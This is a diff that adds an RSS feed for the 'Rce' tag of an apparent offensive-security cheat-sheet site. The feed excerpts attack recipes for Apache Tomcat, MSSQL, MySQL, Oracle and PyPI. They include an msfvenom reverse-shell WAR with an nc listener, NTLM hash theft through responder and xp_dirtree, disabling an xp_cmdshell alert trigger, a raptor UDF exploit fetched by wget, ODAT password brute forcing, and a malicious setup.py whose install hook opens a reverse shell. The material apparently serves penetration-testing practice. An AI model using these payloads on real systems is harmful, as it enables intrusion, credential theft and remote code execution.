@@ -1,0 +1,46 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Rce on TLDRBins</title>
+    <link>https://tldrbins.github.io/@rce/</link>
+    <description>Recent content in Rce on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@rce/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Apache Tomcat</title>
+      <link>https://tldrbins.github.io/apache_tomcat/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/apache_tomcat/</guid>
+      <description>Config Location /usr/share/tomcat9/etc/tomcat-users.xml /etc/tomcat9/tomcat-users.xml RCE (Authenicated) 1. Create a WAR file msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.10 LPORT=1337 -f war -o revshell.war 2. Start a listener rlwrap nc -lvnp 1337 3a. Via Manager GUI +--------------------------------------------+ | Exploit | +--------------------------------------------+ | 1. Login to Tomcat Web Application Manager | | 2. WAR file to deploy -&amp;gt; Deploy | | 3. Click /revshell in Applications table | +--------------------------------------------+ 3b. Via Manager Script curl -u &amp;#39;&amp;lt;USERNAME&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; http://example.</description>
+    </item>
+    <item>
+      <title>MSSQL Privilege Escalation</title>
+      <link>https://tldrbins.github.io/mssql_privilege_escalation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/mssql_privilege_escalation/</guid>
+      <description>Abuse #1: Steal NTLM hash # In our local Linux machine sudo responder -I tun0 # Inside mssql terminal xp_dirtree &amp;#39;\\10.10.14.10\any\thing&amp;#39;; # Or use master; exec xp_dirtree &amp;#39;\\10.10.14.10\any\thing&amp;#39;; # Or load_file(&amp;#39;\\10.10.14.10\any\thing&amp;#39;); Abuse #2: Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.server_triggers; # Disable trigger if any disable trigger ALERT_xp_cmdshell on all server; # Enable xp_cmdshell enable_xp_cmdshell; # RCE xp_cmdshell whoami Abuse #3: Impersonate sa to run xp_cmdshell execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;show advanced options&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;xp_cmdshell&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; EXEC master.</description>
+    </item>
+    <item>
+      <title>Mysql Privilege Escalation</title>
+      <link>https://tldrbins.github.io/mysql_privilege_escalation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/mysql_privilege_escalation/</guid>
+      <description>Abuse #1: User Defined Function (UDF) # Get the raptor_udf2.c wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c # Compile the source script gcc -g -c raptor_udf2.c gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc # Copy to target folder cp raptor_udf2.so /dev/shm/raptor_udf2.so # Connect to database as root mysql -u root -p&amp;lt;PASSWORD&amp;gt; mysql # UDF create table foo(line blob); insert into foo values(load_file(&amp;#39;/dev/shm/raptor_udf2.so&amp;#39;)); # Get plug-in directory show variables like &amp;#39;%plugin%&amp;#39;; +-----------------+---------------------------------------------+ | Variable_name | Value | +-----------------+---------------------------------------------+ | plugin_dir | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ | | plugin_maturity | gamma | +-----------------+---------------------------------------------+ # Copy the plugin_dir value select * from foo into dumpfile &amp;#39;/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.</description>
+    </item>
+    <item>
+      <title>Oracle Database</title>
+      <link>https://tldrbins.github.io/oracle/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/oracle/</guid>
+      <description>Tools sqlplus # Install sudo apt install oracle-instantclient-sqlplus # export LD_LIBRARY_PATH export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH} # Check sqlplus -V ODAT (Oracle Database Attacking Tool) Download ODAT&#xA;# Install sudo apt install odat # Check odat --version Enum # SID enum (You only need one) odat sidguesser -s 10.10.11.10 # User/Password brute force odat passwordguesser -s 10.10.11.10 -d &amp;lt;SID&amp;gt; --accounts-file accounts.txt # Run all checks with creds as sysdba odat all -s 10.</description>
+    </item>
+    <item>
+      <title>Pypi</title>
+      <link>https://tldrbins.github.io/pypi/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/pypi/</guid>
+      <description>Abuse #1: Remote Pypi Server 1. Create files mkdir evil_package mkdir evil_package/evil_package cd evil_package touch README.md touch evil_package/__init__.py touch setup.cfg touch setup.py 2. Replace setup.py #!/usr/bin/env python3 from setuptools.command.install import install from setuptools import setup import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&amp;#34;10.10.14.10&amp;#34;,1337)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call([&amp;#34;/bin/sh&amp;#34;, &amp;#34;-i&amp;#34;]) setup(name=&amp;#34;evil_package&amp;#34;, version=&amp;#34;1.0.0&amp;#34;, description=&amp;#34;Evil Package&amp;#34;, author=&amp;#34;user&amp;#34;, author_email=&amp;#34;user@example.com&amp;#34;, url=&amp;#34;http://example.com&amp;#34;, license=&amp;#34;MIT&amp;#34;, zip_safe=False, cmdclass={&amp;#34;install&amp;#34;: Exploit}) 3.</description>
+    </item>
+  </channel>
+</rss>
